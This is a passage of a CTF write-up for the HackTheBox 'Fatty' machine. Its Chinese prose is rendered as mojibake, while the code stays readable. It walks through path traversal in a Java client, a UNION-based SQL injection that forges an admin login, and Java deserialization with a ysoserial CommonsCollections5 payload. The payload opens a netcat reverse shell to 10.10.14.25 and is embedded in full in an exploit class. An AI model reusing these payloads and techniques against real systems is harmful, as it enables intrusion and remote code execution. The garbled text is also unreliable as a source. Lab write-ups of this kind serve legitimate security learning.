æ–‡ä»¶ä¸­è®¾ç½®ä¸º127.0.0.1 server.fatty.htbå¹¶ä½¿ç”¨socatè½¬å‘æœ¬åœ°8000çš„æµé‡åˆ°10.10.10.147:1337ä¸Š 1socat TCP-LISTEN:8000,fork TCP:10.10.10.174:1337 å½“ç„¶ã€‚ç¬¬ä¸€ç§æ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ä½†æ˜¯å®é™…éå¸¸éº»çƒ¦ã€‚å‡å¦‚æˆ‘ä»¬åªæ˜¯è§£å‹jaråŒ…ï¼Œæ›´æ”¹beans.xmlå†é‡æ–°å‹ç¼©ä½jaråŒ…çš„è¯jar -uf fatty-client.jar beans.xmlã€‚å†æ¬¡è¿è¡Œå°†ä¼šå‘ç°å‡ºç°java security problemsã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºæ•´ä¸ªjaråŒ…ä¸­æœ‰éƒ¨åˆ†é…ç½®æ–‡ä»¶ä¼šå› ä¸ºsha256å˜åŒ–çš„beans.xmlå‡ºé”™,è¿™è·Ÿjava seal çš„æ“ä½œæœ‰å…³ã€‚ä¸€æ—¦ç›¸å…³æ–‡ä»¶å˜åŒ–ï¼Œå°†å¯¼è‡´æŠ›å‡ºSealing Violationã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»åˆ æ‰å†…å®¹ä¸­è®°å½•äº†sha256å€¼çš„æ–‡ä»¶å¹¶è®¾å®šé…ç½®ã€‚ æ“ä½œæ–¹æ³•METAINF/MANIFEST.MF ä¸­åº•ä¸‹æ‰€æœ‰sha256ç›¸å…³å†…å®¹å…¨éƒ¨å»æ‰ï¼ŒåŒæ—¶ä¸Šé¢è®¾ç½®ä¸­Sealed: Trueè¿™ä¸€è¡Œå»æ‰ã€‚ 123456Manifest-Version: 1.0 Archiver-Version: Plexus Archiver Built-By: root Created-By: Apache Maven 3.3.9 Build-Jdk: 1.8.0_232 Main-Class: htb.fatty.client.run.Starter æ¥ç€åˆ æ‰META-INF/1.RSA META-INF/1.SF ä¸¤ä¸ªåŒæ ·å«æœ‰sha256å€¼çš„æ–‡ä»¶ã€‚é‡æ–°æ›´æ–°jaråŒ…æ–‡ä»¶å³å¯ã€‚(æˆ–è€…ç›´æ¥zipæ‰“åŒ…) å½“ç„¶ã€‚è™½ç„¶æˆ‘å¼€å§‹æ²¡æœ‰è¿›è¡Œè¿™æ­¥æ“ä½œ,åé¢è¿˜æ˜¯ä¸€æ ·è¦åšçš„ã€‚ ç„¶åç°åœ¨æˆ‘ä»¬å¯ä»¥è·ŸæœåŠ¡è¿›è¡Œäº¤äº’äº†ã€‚ä½¿ç”¨ç›´æ¥noteä¸­qtc:clarabibiæˆåŠŸç™»å½•åã€‚è¯•äº†ä¸€ä¸‹å‡ ä¸ªæ“ä½œå‘ç°è¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚æˆ‘ä»¬æ‰€åœ¨çš„ç”¨æˆ·ç»„æœ‰ping,whoami,configsè¿™æ ·å‡ ä¸ªæ“ä½œã€‚å…¶ä¸­configsæ‰§è¡Œçš„ä¼¼ä¹æ˜¯æœåŠ¡ç«¯åˆ—ç›®å½•çš„å·¥ä½œã€‚guiåº•ä¸‹æœ‰ä¸€ä¸ªæŒ‰é’®open,å¯ä»¥è¾“å…¥å¯¹åº”æ–‡ä»¶åè¯»å–æœåŠ¡ç«¯ç›®å½•çš„æ–‡ä»¶ã€‚å°è¯•openåŠŸèƒ½æ—¶fuzzè§¦å‘äº†æŠ¥é”™ ä¼¼ä¹..è¿™æ ·çš„æ“ä½œå¯ä»¥è¿›è¡Œä¸€,ä¸¤å±‚è·¯å¾„ç©¿è¶Šã€‚ä½†æ˜¯å¹¶ä¸èƒ½è¾¾æˆä»»æ„åˆ—ç›®å½•ã€‚å› ä¸ºå®ƒè¿‡æ»¤äº†../..ã€‚ çœ‹äº†ä¸‹æºç ã€‚åˆ—ç›®å½•å¯¹åº”çš„åº”è¯¥æ˜¯è¿™é‡ŒInvokerä¸­çš„showfiles 12345678910111213public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException &#123; String methodName = (new Object() &#123; &#125;).getClass().getEnclosingMethod().getName(); logger.logInfo(\"[+] Method '\" + methodName + \"' was called by user '\" + this.user.getUsername() + \"'.\"); if (AccessCheck.checkAccess(methodName, this.user)) &#123; return \"Error: Method '\" + methodName + \"' is not allowed for this user account\"; &#125; else &#123; this.action = new ActionMessage(this.sessionID, \"files\"); this.action.addArgument(folder); this.sendAndRecv(); return this.response.hasError() ? \"Error: Your action caused an error on the application server!\" : this.response.getContentAsString(); &#125;&#125; è€Œæˆ‘ä»¬guiä¸­å¯¹åº”configsçš„æ“ä½œæ˜¯ å¯è§ã€‚æ­¤å¤„åŸæœ¬è®¾å®šäº†ç›®å½•ä¸ºconfigs.ä½†å€˜è‹¥æˆ‘ä»¬ä¿®æ”¹å…¶ä¸º..æ˜¯å¦å°±èƒ½è·¯å¾„ç©¿è¶Šäº†å‘¢ï¼Ÿä¸å¦¨ä¸€è¯•ã€‚å‚ç…§ippsecè§†é¢‘,è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿èŠ‚çœæ‰‹åŠ¨æ“ä½œæ—¶é—´,è€Œä¸æ˜¯åå¤ä¿®æ”¹æºç é‡æ–°build jaråŒ…(ç„¶è€Œæ‰“è„¸äº†,åé¢é‡æ–°buildäº†ä¸¤æ¬¡â€¦â€¦)ä¸å¦‚ç›´æ¥å¯¼å…¥jaråŒ…å¹¶ç¼–å†™exp. äºæ˜¯è¿™é‡Œæˆ‘å»ä¸‹äº†ä¸€ä¸ªlinux ä¸Šçš„idea.ä¸å¾—ä¸åæ§½é…ç½®ideç¯å¢ƒå±…ç„¶ä¹Ÿå‡ºäº†å°é—®é¢˜ =&gt; ideaæ— æ³•è‡ªåŠ¨è¯†åˆ«/usr/lib/jvmä¸­çš„jdk.å¿…é¡»æ‰§è¡Œsudo apt-get install openjdk-8-jdkåã€‚ideaæ‰èƒ½è‡ªåŠ¨è¯†åˆ«jvmä¸­çš„java8. æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç¯å¢ƒä¸ºjava8çš„å·¥ç¨‹ã€‚å¹¶åœ¨libraryä¸­å¯¼å…¥fatty-client.jarã€‚ æŒ‰ç…§ippsecçš„æ€è·¯ç®€å•å†™ä¸€ä¸ªåˆ©ç”¨exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import htb.fatty.client.connection.Connection;import htb.fatty.client.methods.Invoker;import htb.fatty.shared.message.MessageBuildException;import htb.fatty.shared.message.MessageParseException;import htb.fatty.shared.resources.User;import java.io.IOException;public class exploit &#123; public static void main(String[] args) throws IOException&#123; Connection conn = null; try &#123; conn = Connection.getConnection(); &#125;catch(Exception e)&#123; System.out.println(\"[-] connection failed\"+e.getMessage()); System.exit(1); &#125; System.out.println(\"[+] Successfully connected\"); User user=new User(\"qtc\",\"clarabibi\"); if(conn.login(user))&#123; System.out.println(\"[+] Successfully logged in\"); &#125;else&#123; System.out.println(\"[-] Login failed\"); &#125; String rolename=conn.getRoleName(); user.setRoleByName(rolename); System.out.println(\"[+] rolename is: \"+rolename); /* Invoker invoker =new Invoker(conn,user); String response=\"\"; try &#123; response=invoker.showFiles(\"..\"); &#125; catch (MessageParseException e) &#123; e.printStackTrace(); &#125; catch (MessageBuildException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Server response:\\n\"+ response); */ &#125;&#125; è¿™æ ·æˆ‘ä»¬å°±èƒ½é€šè¿‡javaä»£ç æ¥è·ŸæœåŠ¡ç«¯äº¤äº’äº†ã€‚åŒæ—¶æ¯”è¾ƒæ–¹ä¾¿çš„æ˜¯ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ä¼ å…¥çš„å€¼æ¥èŠ‚çœæ—¶é—´æ¯”å¦‚ä¸Šé¢ä»£ç æ³¨é‡Šçš„éƒ¨åˆ†å³æ˜¯invokerè°ƒç”¨showFilesæ–¹æ³•å¹¶è·å–å›æ˜¾ã€‚å¹¶ä¸”æˆ‘ä»¬ç›´æ¥å°±å¯ä»¥ä¿®æ”¹ä¼ å…¥çš„å‚æ•°ä¸º..è¿›è¡Œè·¯å¾„ç©¿è¶Š.å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ã€‚(try catch ç›´æ¥ç”¨ideaå¿«æ·é”®æ·»åŠ å³å¯ã€‚éå¸¸æ–¹ä¾¿) 123456Server response:logstarstart.shfatty-server.jarfiles æ¥ä¸‹æ¥ä½¿ç”¨openæ–¹æ³•è¯»æ–‡ä»¶ã€‚æˆ‘ä»¬æŠŠinvokerè°ƒç”¨çš„æ–¹æ³•æ”¹ä¸ºopen(&quot;..&quot;,&quot;start.sh&quot;) 123456789101112131415#!/bin/sh# Unfortunately alpine docker containers seems to have problems with services.# I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, # both services are now started as part of the docker startup script.# Start cron servicecrond -b# Start ssh server/usr/sbin/sshd# Start Java application serversu - qtc /bin/sh -c \"java -jar /opt/fatty/fatty-server.jar\" çœ‹æ¥æœåŠ¡ç«¯è¿è¡Œçš„å°±æ˜¯fatty-server.jaräº†.ä¸ºäº†ææ¸…æ¥šæœåŠ¡ç«¯ç©¶ç«Ÿåšäº†ä»€ä¹ˆæ“ä½œã€‚æ¯”å¦‚ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨æˆ·ç»„useræƒé™æœ‰äº›æ–¹æ³•è°ƒç”¨ä¸äº†,è¦æ€ä¹ˆå˜ä¸ºadminæƒé™ã€‚æœåŠ¡ç«¯æ˜¯å¦åˆè°ƒç”¨äº†readObjectå‘¢ï¼Ÿè¿™äº›éƒ½éœ€è¦å¯¹serverçš„æºç å®¡è®¡ã€‚ ç„¶è€Œé—®é¢˜åœ¨äºã€‚æˆ‘ä»¬å¹¶æ²¡æœ‰åŠæ³•åˆ©ç”¨ç°æœ‰çš„æ–¹æ³•è·å–æœåŠ¡jaråŒ…çš„å®Œæ•´æ•°æ®ã€‚å› ä¸ºopenæ–¹æ³•è°ƒç”¨çš„æ˜¯ 12345try &#123; response = this.response.getContentAsString();&#125; catch (Exception var6) &#123; response = \"Unable to convert byte[] to String. Did you read in a binary file?\";&#125; å³ä½¿ä¸çŸ¥é“æœåŠ¡ç«¯æ˜¯æ€ä¹ˆè¯»æ–‡ä»¶çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“å›æ˜¾çš„å†…å®¹æ˜¯å¯¹this.respoonseè°ƒç”¨getContentAsString()æ¥å°†å†…å®¹è½¬ä¸ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆè¯»å–jaråŒ…è¿™ç§äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å¿…ç„¶ä¼šæœ‰ä¸å¯è§å­—ç¬¦è¢«ç›´æ¥å¿½è§†ã€‚å¯¼è‡´æˆ‘ä»¬è·å–çš„æ–‡ä»¶ä¸å®Œæ•´ã€‚é‚£ä¹ˆå¿…é¡»é‡å†™openæ–¹æ³•ã€‚è®©å®ƒèƒ½ç›´æ¥å°†responseå†…å®¹å†™è¿›æœ¬æœºã€‚ ç„¶åè¿™é‡Œå°±æ˜¯æ¯”è¾ƒå¤´ç–¼çš„ä¸€å¤„äº†ã€‚æˆ‘çŸ¥é“eclipseå¯ä»¥ç›´æ¥import ç°æœ‰ä¸€ä¸ªjavaæ–‡ä»¶ä½œä¾èµ–ç„¶åé‡å†™è°ƒç”¨(å‰ææ˜¯æ‰§è¡Œäº†å‰é¢çš„unsealè¿‡ç¨‹ã€‚å³åˆ é™¤äº†rsa,sf,ä¿®æ”¹äº†mf)ã€‚ä½†æ˜¯ideaæˆ‘ä¸€ç›´æ²¡æ‰¾åˆ°å¥½çš„è°ƒç”¨æ–¹æ³•ã€‚å¸Œæœ›æœ‰å¤§ä½¬èƒ½æ•™æ•™æˆ‘ideaæ€ä¹ˆå¤„ç†æœ€ä¼˜â€¦.. æ€»ä¹‹æœ€åã€‚æˆ‘é€‰æ‹©äº†ç›´æ¥é‡å†™ä»£ç å†build jaråŒ…çš„æ–¹æ³•ã€‚è™½ç„¶æœ‰ç‚¹è ¢ä½†æ˜¯è‡³å°‘å¯è¡Œã€‚é¦–å…ˆæˆ‘ä»¬ç›´æ¥è·å–æ–‡ä»¶å†…å®¹å¹¶å†™å…¥ã€‚å› æ­¤åœ¨openæ–¹æ³•ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ã€‚ å½“ç„¶ç›´æ¥æ–°åˆ›å»ºä¸€ä¸ªæ–¹æ³•å†™æ–‡ä»¶å¹¶åœ¨expä¸­ä½¿ç”¨invokerè°ƒç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ ç„¶åå°±æ˜¯è¿™æ¬¡å­¦åˆ°çš„å‘½ä»¤è¡Œä¸‹é‡æ–°buildä¸€ä¸ªjaråŒ…çš„å®Œæ•´æµç¨‹ 12345678javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.javamkdir raw cp fatty-client.jar raw/fatty-client.jar cd raw &amp;&amp; unzip fatty-client.jar......mv htb/fatty/client/methods/*.class raw/htb/fatty/client/methods/cd raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF fatty.jar . æ¯”è¾ƒé—¹å¿ƒçš„æ˜¯ã€‚å› ä¸ºä¹‹å‰ç”¨ideaè‡ªåŠ¨åç¼–è¯‘çš„å†…å®¹,å¯¼è‡´æºç çš„javaæ–‡ä»¶æ‰¾ä¸åˆ°ã€‚æˆ‘è¿˜å¾—é‡æ–°åç¼–è¯‘ä¸€ä¸‹jaråŒ…â€¦â€¦ç„¶åä¿®æ”¹Invoker.javaã€‚ 123456789101112131415161718192021222324252627282930313233343536import java.io.FileOutputStream;...... public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException &#123; String methodName = (new Object() &#123; &#125;).getClass().getEnclosingMethod().getName(); logger.logInfo(\"[+] Method '\" + methodName + \"' was called by user '\" + this.user.getUsername() + \"'.\"); if (AccessCheck.checkAccess(methodName, this.user)) &#123; return \"Error: Method '\" + methodName + \"' is not allowed for this user account\"; &#125; else &#123; this.action = new ActionMessage(this.sessionID, \"open\"); this.action.addArgument(foldername); this.action.addArgument(filename); this.sendAndRecv(); FileOutputStream fos; fos = new FileOutputStream(\"/tmp/fatty-server.jar\"); if (this.response.hasError()) &#123; return \"Error: Your action caused an error on the application server!\"; &#125; else &#123; String response = \"\"; try &#123; response = this.response.getContentAsString(); &#125; catch (Exception var6) &#123; response = \"Unable to convert byte[] to String. Did you read in a binary file?\"; &#125; fos.write(this.response.getContent()); fos.close(); return response; &#125; &#125;&#125;...... ç„¶åå°±æ˜¯javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java.æˆ‘ä»¬ä¼šå‘ç°htb/fatty/client/methods/ä¸‹ç¼–è¯‘å¥½äº†åå‡ ä¸ªclassã€‚æ¥ä¸‹æ¥å°±æ˜¯è§£åŒ…jaråŒ…ã€‚è½¬ç§»classæ–‡ä»¶å¹¶é‡æ–°æ‰“åŒ…jarçš„äº‹æƒ…äº†ã€‚ ideaä¸­å¯¼å…¥æˆ‘ä»¬é‡æ–°æ”¹å¥½çš„jaråŒ…ã€‚å†æ¬¡æ‰§è¡Œå³å¯å‘ç°èƒ½å¤Ÿæ­£å¸¸ä¸‹è½½äº†ã€‚ ä¸‹è½½å¥½30åˆ†é’Ÿåæˆ‘ä»¬å¾—åˆ°äº†fatty-server.jarã€‚å†æ¬¡å®¡è®¡serveræºç  è¿™ä¸€æ¬¡å¾ˆå¿«å°±èƒ½åœ¨ä¹‹å‰ä¸ç¡®å®šçš„changePWå¤„çœ‹åˆ°readObject()æ–¹æ³•è°ƒç”¨äº†ã€‚ä¹Ÿå°±æ˜¯è¯´è‚¯å®šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ä½†æ˜¯æ³¨æ„ã€‚æŠŠæ•´ä¸ªæºç è¿‡ä¸€éåä¼šå‘ç°changePWæ–¹æ³•å¯¹åº”çš„methodID 7éœ€è¦adminroleæ‰èƒ½æ‰§è¡Œã€‚ 1234567891011public static Role getAdminRole() &#123; return new Role(0, \"admin\", new int[]&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12&#125;);&#125;public static Role getUserRole() &#123; return new Role(0, \"user\", new int[]&#123;1, 2, 3, 4, 5, 6&#125;);&#125;public static Role getAnonymous() &#123; return new Role(0, \"anonymous\", new int[0]);&#125; æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªèƒ½æˆä¸ºadmin roleçš„æ–¹æ³•ã€‚å›åˆ°ç™»å½•é‚£é‡Œçš„æ–¹æ³•å»å®¡è®¡ 123456789101112131415161718192021222324252627282930313233343536public User checkLogin(User user) throws FattyDbSession.LoginException &#123; Statement stmt = null; ResultSet rs = null; User newUser = null; try &#123; stmt = this.conn.createStatement(); rs = stmt.executeQuery(\"SELECT id,username,email,password,role FROM users WHERE username='\" + user.getUsername() + \"'\"); try &#123; Thread.sleep(3000L); &#125; catch (InterruptedException var10) &#123; return null; &#125; if (rs.next()) &#123; int id = rs.getInt(\"id\"); String username = rs.getString(\"username\"); String email = rs.getString(\"email\"); String password = rs.getString(\"password\"); String role = rs.getString(\"role\"); newUser = new User(id, username, password, email, Role.getRoleByName(role), false); if (newUser.getPassword().equalsIgnoreCase(user.getPassword())) &#123; return newUser; &#125; else &#123; throw new FattyDbSession.LoginException(\"Wrong Password!\"); &#125; &#125; else &#123; throw new FattyDbSession.LoginException(\"Wrong Username!\"); &#125; &#125; catch (SQLException var11) &#123; this.logger.logError(\"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='\" + user.getUsername() + \"' &lt;==\"); this.logger.logError(\"[-] Exception was: '\" + var11.getMessage() + \"'\"); return null; &#125;&#125; å¾ˆæ˜æ˜¾ã€‚ç™»å½•çš„ä½ç½®å­˜åœ¨sqlæ³¨å…¥ã€‚å…·ä½“æµç¨‹æ˜¯ï¼šæ‰§è¡ŒsqlæŸ¥è¯¢,ç”¨æŸ¥è¯¢ç»“æœæ¥å®ä¾‹åŒ–Userç±»ã€‚å¹¶ä¸”è°ƒç”¨äº†ä¸€ä¸ªé’ˆå¯¹passwordçš„æ£€æŸ¥newUser.getPassword().equalsIgnoreCase(user.getPassword() è¿™ä¹Ÿå°±ä»£è¡¨ç®€å•çš„ä¸‡èƒ½å¯†ç ä¸èµ·ä½œç”¨äº†ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹çœ‹Userç±»å¦‚ä½•å®ä¾‹åŒ–çš„ã€‚ç›´æ¥æ‰¾æ„é€ æ–¹æ³•å¦‚æœæ˜¯æˆ‘ä»¬ä¹‹å‰é‚£æ ·ã€‚ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªå«username,passwordçš„Userå¯¹è±¡ã€‚å®ƒä¼šæ£€æŸ¥ä¸€ä¸ªåˆå§‹åŒ–ä¸­hashçš„å€¼æ˜¯å¦ä¸ºfalse.å¦‚æœä¸ä¸ºfalseã€‚é‚£ä¹ˆä¼šåƒä¸Šé¢çš„æ„é€ æ–¹æ³•ä¸€æ ·å°†sha256(username+password+&#39;clarabibimakeseverythingsecure&#39;)è¿›è¡Œæ¯”å¯¹ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨&#39; or &#39;1&#39;=&#39;1.é‚£ä¹ˆsqlè¯­å¥è¿”å›ç»“æœè‡ªç„¶æ˜¯qtcçš„æ•°æ®ã€‚ä½†æ˜¯ 1sha256(&quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;clarabibimakeseverythingsecure&quot;) &#x3D; sha256(&quot;qtc&quot;+&quot;clarabibi&quot;+&quot;clarabibimakeseverythingsecure&quot;) æ˜¯ä¸æˆç«‹çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç™»é™†ã€‚ ä½†æ˜¯ä¸è¦ç´§ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªsqlè¯­å¥é‡Œä½¿ç”¨unionæŸ¥è¯¢è¿”å›ä¸€ä¸ªadminç”¨æˆ·ã€‚å› ä¸ºå®ƒæ˜¯æ ¹æ®æŸ¥è¯¢ç»“æœè¿”å›æ•°æ®æ¥å®ä¾‹åŒ–Userç±»è¿›è€Œåˆ¤æ–­roleæ˜¯å¦ä¸ºadminçš„ã€‚æˆ‘ä»¬åªéœ€è¦ 1User user=new User(\" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin\",\"byc_404\",false); é¦–å…ˆä¿è¯Userç±»hashå€¼ä¸ºfalseã€‚è¿™æ ·passwordä¸ä¼šè¿›è¡Œsha256èµ‹å€¼ã€‚ç„¶åç”±äºabcç”¨æˆ·ä¸å­˜åœ¨ã€‚æˆ‘ä»¬unionæŸ¥è¯¢è¿”å›çš„å€¼å³ 11,'byc_404','a@b.com','byc_404','admin' ç”¨æˆ·roleå·²ç»è¢«è®¾ä¸ºadminäº†.æ­¤æ—¶passwordä¸passwordç›¸åŒã€‚æ ¡éªŒé€šè¿‡ æˆ‘ä»¬æ›´æ”¹ä¸‹expä¸­userå®ä¾‹åŒ–çš„æ–¹æ³•ã€‚å¹¶ä¸”å°è¯•è°ƒç”¨adminæƒé™çš„ipconfig æˆåŠŸæ‰§è¡Œã€‚æ­¤å¤„è¿˜å¯ä»¥ä»ipconfigä¸­172.28çœ‹å‡ºæ¥javaè¿è¡Œçš„é¶æœºä¼¼ä¹æ˜¯dockerã€‚ ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å°è¯•changePWè¿›è¡Œååºåˆ—åŒ–äº†ã€‚ä¸è¿‡åŒæ ·ç”±äºåŸå§‹changePWæ–¹æ³•åªä¼ é€’ä¸€ä¸ªåŒå‚æ•°Userå¯¹è±¡ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜å¾—é‡å†™changePWæ–¹æ³•ã€‚ 1234567public String changePW(String payload) throws MessageParseException, MessageBuildException, IOException &#123; this.action=new ActionMessage(this.sessionID,\"changePW\"); this.action.addArgument(payload); this.sendAndRecv(); return this.response.getContentAsString();&#125; æ›´æ”¹Invokeræºç å,ç„¶åå°±æ˜¯æŒ‰ç…§ä¸Šé¢çš„æµç¨‹é‡æ–°build jaråŒ…äº†ã€‚ é‡æ–°å¯¼å…¥åä½¿ç”¨ysoserialç”Ÿæˆpayload 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'nc 10.10.14.25 9001 -e /bin/sh' |base64 -w 0 (dockeré¶æœºæ²¡æœ‰bashâ€¦alpineé¶æœºé€šç—…ã€‚æ‰€å¹¸æœ‰è€ç‰ˆæœ¬nc) æœ€ç»ˆçš„exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import htb.fatty.client.connection.Connection;import htb.fatty.client.methods.Invoker;import htb.fatty.shared.message.MessageBuildException;import htb.fatty.shared.message.MessageParseException;import htb.fatty.shared.resources.User;import java.io.IOException;public class exploit &#123; public static void main(String[] args) throws IOException&#123; Connection conn = null; try &#123; conn = Connection.getConnection(); &#125;catch(Exception e)&#123; System.out.println(\"[-] connection failed: \"+ e.getMessage()); System.exit(1); &#125; System.out.println(\"[+] Successfully connected\"); User user=new User(\" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin\",\"byc_404\",false); if(conn.login(user))&#123; System.out.println(\"[+] Successfully logged in\"); &#125;else&#123; System.out.println(\"[-] Login failed\"); &#125; String rolename=conn.getRoleName(); user.setRoleByName(rolename); System.out.println(\"[+] rolename is: \"+rolename); Invoker invoker =new Invoker(conn,user); String response=\"\"; String payload=\"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHm5jIDEwLjEwLjE0LjI1IDkwMDEgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=\"; try &#123; response=invoker.changePW(payload); &#125; catch (MessageParseException e) &#123; e.printStackTrace(); &#125; catch (MessageBuildException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Server response:\\n\"+ response); &#125;&#125; æ¥åˆ°å›æ˜¾åä½¿ç”¨ash -i 